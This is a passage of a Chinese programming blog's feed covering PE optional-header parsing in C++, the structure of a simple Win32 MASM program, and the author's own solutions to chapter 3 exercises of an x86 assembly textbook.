class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MinorOperatingSystemVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;用户自定义主版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MajorImageVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;用户自定义次版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MinorImageVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;所需系统主版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MajorSubsystemVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;所需系统次版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MinorSubsystemVersion &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">delete</span>[] FileBuffer;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br></pre></td></tr></table></figure><p>同样，将上述代码放置最后，对扩展头进行解析，因字段太多，没一一列举，运行后如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101702y6ani066ixy98vii.png" alt=""></p><p>对于该结构的最后一个字段，它是一个数组，这个数组有 16 个成员，代表的是目录表中的项，每项包含两个结构体成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAddress;    <span class="comment">// 数据块的起始 RVA</span></span><br><span class="line">    DWORD Size;              <span class="comment">// 数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>其实遍历它也不是很难，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="string">&quot;目录表&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;RVA\t\t大小&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt;</span><br><span class="line">        std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.DataDirectory[i].VirtualAddress &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt;</span><br><span class="line">        std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.DataDirectory[i].Size &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101746zn7aznjwsllhqujo.png" alt=""></p><p>将上述与 LoadPE 对照，看下是否正确，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101806x3mrbgwwmvlu33gb.png" alt=""></p><p>从上面可以看出，已经成功遍历出目录表中每项的 RVA 和大小。关于目录表各项具有什么作用，我会在本系列文章中后面详细讲到，故在此不再作过多讲解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;可执行文件格式是操作系统本身执行机制的反映，理解它有助于对操作系统的深刻理解，掌握可执行文件的数据结构及其一些机理，是研究软件安全的必修课。</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="PE" scheme="https://zeronohacker.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>对一个简单的 win32 汇编程序剖析及拓展</title>
    <link href="https://zeronohacker.github.io/2018/08/06/analysis-and-expansion-a-simple-win32-assembler/"/>
    <id>https://zeronohacker.github.io/2018/08/06/analysis-and-expansion-a-simple-win32-assembler/</id>
    <published>2018-08-06T06:12:46.000Z</published>
    <updated>2021-09-19T07:24:14.747Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一个简单的-win32-汇编程序"><a href="#一个简单的-win32-汇编程序" class="headerlink" title="一个简单的 win32 汇编程序"></a>一个简单的 win32 汇编程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">; Include 文件定义</span><br><span class="line">inclue        windows.inc</span><br><span class="line">include       user32.inc</span><br><span class="line">include       kernel32.inc</span><br><span class="line">includelib    user32.lib</span><br><span class="line">includelib    kernel32.lib</span><br><span class="line">; 数据段</span><br><span class="line">.data</span><br><span class="line">szCaption db &#x27;A MessageBox !&#x27;,0</span><br><span class="line">szText db &#x27;Hello, World !&#x27;,0</span><br><span class="line">; 代码段</span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">    invoke MessageBox,NULL,offset szText,\</span><br><span class="line">            offset szCaption,MB_OK</span><br><span class="line">    invoke ExitProcess,NULL</span><br><span class="line">    end start</span><br></pre></td></tr></table></figure><h2 id="指定指令集"><a href="#指定指令集" class="headerlink" title="指定指令集"></a>指定指令集</h2><p>.386 语句是汇编程言的伪指令，类似的还有 .8086，.186，.286，.386/.386p，.486/.486p 和 .586/.586p 等，用于告诉编译器在本程序中使用的指令集。在 DOS 汇编默认使用的是 8086 指令集，如果在源程序中写入 80386 所特有的指令或使用 32 位的寄存器就会报错，为了在 DOS 环境下进行保护模式编程或仅为了使用 32 位寄存器，常在 DOS 的汇编中使用 .386 来定义。Win32 环境工作在 80386 及以上的处理器中，所以 .386 这一句必不可少。后面带 p 的伪指令则表示程序中可以使用特权指令。</p><h2 id="model-语句"><a href="#model-语句" class="headerlink" title="model 语句"></a>model 语句</h2><p>.model 语句在低版本的宏汇编中已经存在，用来定义程序工作的模式，它的使用方法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.model 内存模式[,语言模式][,其他模式]</span><br></pre></td></tr></table></figure><p>内存模式的定义影响最后生成的可执行文件，现在一般都用 flat (平坦模式)，可以突破 64KB 段大小的限制，在保护模式下，系统把每一个 win32 程序都放在分开的虚拟地址空间中去运行，也就是说，每一个程序都拥有其相互独立的 4GB 地址空间，4GB 的空间用 32 位寄存器全部都能访问到，相关模式可参看下图：</p><p><img src="https://image.zeronohacker.com/article/2018/08/06/400c8ebd1df134a8664386b3f629d6b5.png" alt=""></p><p>在 flat 后，便是语言模式，即子程序的调用方式，开头的示例中所用的是 stdcall，它指出了调用子程序或 win32 API 时参数传递的次序和堆栈平衡的方法。windows 的 API 调用使用的是 stdcall 格式，所以在 win32 汇编中没有选择，必须在 .model 中加上 stdcall 参数。</p><h2 id="option-语句"><a href="#option-语句" class="headerlink" title="option 语句"></a>option 语句</h2><p>用 option 语句定义的选项非常多，比如 option language 定义和 option segment 定义等，在 win32 汇编中，只需要定义 option casemap:none，这个语句定义了程序中的变量和子程序名是否对大小写敏感，由于 win32 API 中的 API 名称是区分大小写的，所以必须指定这个选项，否则在调用 API 的时候会有问题。</p><h2 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h2><p>在 win32 汇编程序中，经常会看到 .stack，.data，.data?，.const，.code 等段说明，其中 .stack 常常被忽略，因为 win32 汇编程序不必考虑堆栈，系统会为程序分配一个向下扩展的、足够大的段作为堆栈段，这一点与 DOS 汇编 (16 位) 不同。注意这里的段不是 DOS 汇编中那种意义上的段，而是内存 “分段”，上一段的结束就是下一段的开始，所有的 “分段” 合起来，包括系统使用的地址空间，就组成了整个可以寻址的 4GB 空间，win32 环境的内存管理使用了 80386 处理器的分页机制，每页 (4KB) 可以自由指定属性，所以上一个 4KB 可能是代码，属性是可执行但不可写，下一个 4KB 就有可能是既可读也可写但不执行的数据，再下面呢？有可能是可读不可写也不可执行的数据。可以换个角度看，程序中的 “分段” 的概念实际上是把不同类型的数据或代码归类，再放到不同属性的内存页中，这中间不涉及使用不同的段选择器。</p><p>.data，.data? 和 .const 定义的是数据段，分别对应不同方式的数据定义，在最后生成可执行文件中也分别放在不同的节区中，有三类数据：</p><ul><li>第一类是可读可写的已定义变量，必须定义在 .data 段，.data 段是已初始化数据段，其中定义的数据是可读可写的，.data 段一般存放在可执行文件的 _DATA 节区内；</li><li>第二类是可读可写的未定义变量，这些变量一般是当作缓冲区或者在程序执行后才开始使用，可定义在 .data 段，也可定义在 .data? 段，但最是定义在 .data? 段，因为生成后，后者比前者体积更大，.data? 段一般存放在 _BSS 节区中；</li><li>第三类数据是一些常量，此类数据可定义在 .const 段中，它是可读不可写的，你也可以定义到 .data 段中，但最好还是选择 .const 段中；</li></ul><p>.code 段为代码段，代码段一般放在 _TEXT 节区中，可读不可写可执行，一定不可写吗？这可不一定，比如一些压缩软件和加壳软件，它们就可以修改程序的代码段，另外在 0 环运行的程序对所有的段都有读写权利，包括代码段。</p><p>.stack 段还需提一下，.stack 段是可读可写可执行的，这样靠动态修改代码的反跟踪模块可以拷贝到堆栈中去边修改边执行，一些病毒或黑客工具用到缓冲区溢出技术也用到了这个特征。</p><h2 id="程序结束和程序入口"><a href="#程序结束和程序入口" class="headerlink" title="程序结束和程序入口"></a>程序结束和程序入口</h2><p>程序的结束由 end 语句来指定，end 后这个标号为程序的入口。当编写多模块程序时，不需要在每个程序文件中指定入口，当最终把多个模块链接在一起时，只需在主模块中指定即可。</p><h2 id="注释和换行"><a href="#注释和换行" class="headerlink" title="注释和换行"></a>注释和换行</h2><p>汇编源程序的注释符号为分号，可放在任意位置。换行符号为反斜杠，如开头那个示例那样。</p><h2 id="调用-API"><a href="#调用-API" class="headerlink" title="调用 API"></a>调用 API</h2><p>API 为应用程序接口，为一系列函数、结构和消息等，不仅为应用程序所调用，同时也是 windows 自身的一部分。在 DOS 下，操作系统功能是通过软中断来实现，比如 int 21h 为 DOS 中断，int 13h 为磁盘中断，int 10h 为视频中断，当应用程序要引用系统功能时要把相应的参数放在各个寄存器再调用相应的中断，程序控制权转到中断处理程序去执行，完成后会通过 iret 中断返回指令回到应用程序中，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,9</span><br><span class="line">mov dx,offset szHello</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>9 为功能号，存放在 ah 中，表示屏幕显示，要输出到屏幕上的内容地址存放在 dx 中，然后调用 int 21h，字符串就会显示在屏幕上，DOS 时代汇编程序员都有一本厚厚的 《中断大全》，因为所有的功能编号包括使用的参数仅从字面上看，是看不出一点头绪来的。另外，80×86 系列处理器最多只能处理 256 个中断，中断数量太少，到最后就会现中断里挂中断，这是非常不好的，所以 API 出现了，win32 系统功能实现放在 Dll 中，我们可以通过 DLL 中的导出表可看出，有三大核心 Dll，分别为 kernel32.dll，gdi32.dll，user32.dll。想一想在 C 语言如何使用一个函数，首先需要先声明，然后就是要这个函数的实现，在 win32 汇编程序中，系统函数声明在 inc 文件中，函数实现在 lib 文件 (静态库) 中，前者由 include 包含，后者由 includelib 包含：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include 文件名</span><br><span class="line">include &lt;文件名&gt;</span><br><span class="line">includelib 文件名</span><br><span class="line">includelib &lt;文件名&gt;</span><br></pre></td></tr></table></figure><p>参照下开头那个示例。那如何调用了，这得使用到另一个伪指令 invoke，为什么会有 invoke 指令，因为在 win32 的 API 中，动不动就是十几个参数，甚至更多，如果都用 push 来写的话，这就非常恐怖了，invoke 正好解决这个问题，参数可写在一行，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke MessageBox,NULL,offset szText,offset szCaption,MB_OK</span><br></pre></td></tr></table></figure><p>invoke 为 MASM 编译器的伪指令，在编译的时候由编译器把上面的指令展开成我们需要的 4 个 push 和 1 个 call 指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push uType</span><br><span class="line">push lpCaption</span><br><span class="line">push szText</span><br><span class="line">push hWnd</span><br><span class="line">call MessageBox</span><br></pre></td></tr></table></figure><p>函数的返回值存放在 eax 中，如果要返回的内容不是一个 eax 所能容纳的，win32 API 采用的方法一般是 eax 返回一个指向返回数据的指针，或者在调用参数中提供一个缓冲区地址，干脆把数据直接返回到缓冲区中去。</p><p>最后提一下在汇编下一个 API 函数的声明，比如 MessageBox：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox PROTO hWnd:dword,lpText:dword,lpCaption:dword,uType:dword</span><br></pre></td></tr></table></figure><p>可简写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox PROTO :dword,:dword,:dword,:dword</span><br></pre></td></tr></table></figure><p>句中 PROTO 是函数声明的伪指令，其实是不存在 MessageBox 的，只存在 MessageBoxA 和 MessageBoxW，在 user32.inc 中有一句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox equ &lt;MessageBoxA&gt;</span><br></pre></td></tr></table></figure><p>MessageBoxA 和 MessageBoxW 对应两个字符集，一个是 ANSI，另一个为 UNICODE，每一个 ANSI 字符只占用一个字节宽，每一个 UNICODE 占两个字节宽，对于欧洲语言体系，ANSI 字符集就已经够了，但对于有成千上万个不同字符的几种东方语言体系来说，UNICODE 字符集更有用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一个简单的-win32-汇编程序&quot;&gt;&lt;a href=&quot;#一个简单的-win32-汇编程序&quot; class=&quot;headerlink&quot; title=&quot;一个简单的 win32 汇编程序&quot;&gt;&lt;/a&gt;一个简单的 win32 汇编程序&lt;/h2&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/categories/Assembly/"/>
    
    
    <category term="Assembly" scheme="https://zeronohacker.github.io/tags/Assembly/"/>
    
  </entry>
  
  <entry>
    <title>Assembly-Language-for-x86-Processors-Part03</title>
    <link href="https://zeronohacker.github.io/2018/06/13/Assembly-Language-for-x86-Processors-Part03/"/>
    <id>https://zeronohacker.github.io/2018/06/13/Assembly-Language-for-x86-Processors-Part03/</id>
    <published>2018-06-13T05:11:14.000Z</published>
    <updated>2021-09-19T06:09:19.009Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文是 Kip·Irvine 所写的 Assembly Langrage for x86 Processors (Seventh Edition) 第三章节的小结以及个人对章节编程习题的解答</p></blockquote><p><img src="https://image.zeronohacker.com/article/2018/06/13/acd43387742959dec4bc102af72d3cd2.png" alt=""></p><h2 id="本章小结"><a href="#本章小结" class="headerlink" title="本章小结"></a>本章小结</h2><p>整型常量表达式是算术表达式，包括了整数常量、符号常量和算术运算符。优先级是指当表达式有两个或更多运算符时，运算符的隐含顺序。</p><p>字符常量是用引号括起来的单个字符。汇编器把字符转换成一个字节，其中包含的是该字符的二进制 ASCII 码。字符串常量是用引号括起来的字符序列，可以选择用空字节标记结束。</p><p>汇编语言有一组保留字，它们含义特殊且只能用于正确的上下文中。标识符是程序员选择的名称，用于标识变量、符号常量、子程序和代码标号。不能用保留字作标识符。</p><p>伪指令是嵌在源代码中的命令，由汇编器进行转换。指令是源代码语句，由处理器在运行时执行。指令助记符是短关键字，用于标识指令执行的操作。标号是一种标识符，用作指令或数据的位置标记。</p><p>操作数是传递给指令的数据。一条汇编指令有 0 ~ 3 个操作数，每一个都可以是寄存器、内存操作数、整数表达式或输入输出端口号。</p><p>程序包括了逻辑段，名称分别为代码段、数据段和堆栈段。代码段包含了可执行指令；堆栈段包含了子程序参数、局部变量和返回地址；数据段包含了变量。</p><p>源文件包含了汇编语言语句。列表文件包含了程序源代码的副本，再加上行号、偏移地址、翻译的机器代码和符号表，适合打印。源文件用文本编辑器创建。汇编器是一种程序，它读取源文件，并生成目标文件和列表文件。链接器也是一种程序，它读取了一个或多个目标文件，并生成可执行文件。后者由操作系统加载器来执行。</p><p>MASM 识别内容数据类型，每一种类型都描述了一组数值，这些数值能分配给指定类型的变量和表达式：</p><ul><li>BYTE 和 SBYTE 定义 8 位变量</li><li>WORD 和 SWORD 定义 16 位变量</li><li>DWORD 和 SDWORD 定义 32 位变量</li><li>QWORD 和 TBYTE 分别定义 8 字节和 10 字节变量</li><li>REAL4、REAL8 和 REAL10 分别定义 4 字节、8 字节和 10 字节实数变量</li></ul><p>数据定义语句为变量预留内存空间，并可以选择性地给变量分配一个名称。如果一个数据定义有多个初始值，那么它的标号仅指向第一个初始值的偏移量。创建字符串数据定义时，要用引号把字符序列括起来。DUP 运算符用常量表达式作为计数器，生成重复的存储分配。当前地址计数器运算符 ($) 用于地址计算表达式。</p><p>x86 处理器用小端顺序在内存中存取数据：变量的最低有效字节存储在其起始 (最低) 地址中。</p><p>符号常量 (或符号定义) 把标识符与一个整数或文本表达式连接起来。有 3 个伪指令能够定义符号常量：</p><ul><li>等号伪指令 (=) 连接符号名称与整数常量表达式</li><li>EQU 和 TESTEQU 伪指令连接符号与整数常量表达式或一些任意的文本</li></ul><div class="tip "><p>提示：以下编程练习中的答案为本人的解答，并非标准答案，仅供参考。</p></div><h2 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h2><span class='p blue'>整数表达式的计算</span><p>参考 3.2 节的程序 AddTwo，编写程序，利用寄存器计算表达式：A = (A + B) – (C – D)。整数值分配给寄存器 EAX、EBX、ECX 和 EDX。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line">.data</span><br><span class="line">A_ DWORD 1</span><br><span class="line">B_ DWORD 2</span><br><span class="line">C_ DWORD 3</span><br><span class="line">D_ DWORD 4</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    mov eax, A_</span><br><span class="line">    mov ebx, B_</span><br><span class="line">    mov ecx, C_</span><br><span class="line">    mov edx, D_</span><br><span class="line">    add eax, ebx</span><br><span class="line">    sub ecx, edx</span><br><span class="line">    sub eax, ecx</span><br><span class="line">    </span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><span class='p blue'>符号整数常量</span><p>编写程序，为一周七天定义符号常量。创建一个数组变量，用这些符号常量作为其初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line">.data</span><br><span class="line">Mon = 1</span><br><span class="line">Tue = 2</span><br><span class="line">Wed = 3</span><br><span class="line">Thu = 4</span><br><span class="line">Fri = 5</span><br><span class="line">Sat = 6</span><br><span class="line">Sun = 7</span><br><span class="line">Week DWORD Mon, Tue, Wed, Thu, Fri, Sat, Sun</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><span class='p blue'>数据定义</span><p>编写程序，对 3.4 节表 3-2 中列出的每一个数据类型进行定义，并将每个变量都初始化为与其类型一致的数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line">.data</span><br><span class="line">; BYTE SBYTE</span><br><span class="line">value1 BYTE &#x27;A&#x27;</span><br><span class="line">value2 BYTE 0</span><br><span class="line">value3 BYTE 255</span><br><span class="line">value4 SBYTE -128</span><br><span class="line">value5 SBYTE 127</span><br><span class="line">; TBYTE</span><br><span class="line">intVal TBYTE 80000000000000001234h</span><br><span class="line">; WORD SWORD</span><br><span class="line">word1 WORD 65535</span><br><span class="line">word2 SWORD -32768</span><br><span class="line">; DWORD SDWORD</span><br><span class="line">dword1 DWORD 12345678h</span><br><span class="line">dword2 SDWORD -2147483648</span><br><span class="line">; FWORD QWORD</span><br><span class="line">fword1 FWORD 123456781234h</span><br><span class="line">qword1 QWORD 1234567812345678h</span><br><span class="line">; REAL4 REAL8 REAL10</span><br><span class="line">reVal1 REAL4 -1.2</span><br><span class="line">reVal2 REAL8 3.2E-260</span><br><span class="line">reVal3 REAL10 4.6E+4096</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><span class='p blue'>符号文本常量</span><p>编写程序，定义几个字符串文本 (引号之间的字符) 的符号名称，并将每个符号名称都用于变量定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line">text1 TEXTEQU &lt;&quot;text1&quot;&gt;</span><br><span class="line">text2 TEXTEQU &lt;&quot;test2&quot;&gt;</span><br><span class="line">.data</span><br><span class="line">val1 BYTE text1</span><br><span class="line">val2 BYTE text2</span><br><span class="line">.code</span><br><span class="line">main PROC  </span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END mainv</span><br></pre></td></tr></table></figure><span class='p blue'>AddTwoSum 的列表文件</span><p>生成 AddTwoSum 程序的列表文件，为每条指令机器代码字节编写说明。某些字节值的含义需要猜测。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode: DWORD</span><br><span class="line"> 00000000.data</span><br><span class="line"> 00000000 00000000sum DWORD 0</span><br><span class="line"> 00000000.code</span><br><span class="line"> 00000000main PROC</span><br><span class="line"> 00000000  B8 00000005    mov eax, 5</span><br><span class="line"> 00000005  83 C0 06    add eax, 6</span><br><span class="line"> 00000008  A3 00000000 R    mov sum, eax</span><br><span class="line">    INVOKE ExitProcess, 0</span><br><span class="line"> 0000000D  6A 00   *    push   +000000000h</span><br><span class="line"> 0000000F  E8 00000000 E   *    call   ExitProcess</span><br><span class="line"> 00000014main ENDP</span><br><span class="line">END main</span><br><span class="line">Segments and Groups:</span><br><span class="line">                N a m e                 Size     Length   Align   Combine Class</span><br><span class="line">FLAT . . . . . . . . . . . . . .GROUP</span><br><span class="line">STACK  . . . . . . . . . . . . .32 Bit 00001000 DWord  Stack  &#x27;STACK&#x27; </span><br><span class="line">_DATA  . . . . . . . . . . . . .32 Bit 00000004 DWord  Public  &#x27;DATA&#x27;</span><br><span class="line">_TEXT  . . . . . . . . . . . . .32 Bit 00000014 DWord  Public  &#x27;CODE&#x27;</span><br><span class="line">Procedures, parameters, and locals:</span><br><span class="line">                N a m e                 Type     Value    Attr</span><br><span class="line">ExitProcess  . . . . . . . . . .P Near 00000000 FLATLength= 00000000 External STDCALL</span><br><span class="line">main . . . . . . . . . . . . . .P Near 00000000 _TEXTLength= 00000014 Public STDCALL</span><br><span class="line">Symbols:</span><br><span class="line">                N a m e                 Type     Value    Attr</span><br><span class="line">@CodeSize  . . . . . . . . . . .Number 00000000h   </span><br><span class="line">@DataSize  . . . . . . . . . . .Number 00000000h   </span><br><span class="line">@Interface . . . . . . . . . . .Number 00000003h   </span><br><span class="line">@Model . . . . . . . . . . . . .Number 00000007h   </span><br><span class="line">@code  . . . . . . . . . . . . .Text    _TEXT</span><br><span class="line">@data  . . . . . . . . . . . . .Text    FLAT</span><br><span class="line">@fardata?  . . . . . . . . . . .Text    FLAT</span><br><span class="line">@fardata . . . . . . . . . . . .Text    FLAT</span><br><span class="line">@stack . . . . . . . . . . . . .Text    FLAT</span><br><span class="line">sum  . . . . . . . . . . . . . .DWord 00000000 _DATA</span><br><span class="line">   0 Warnings</span><br><span class="line">   0 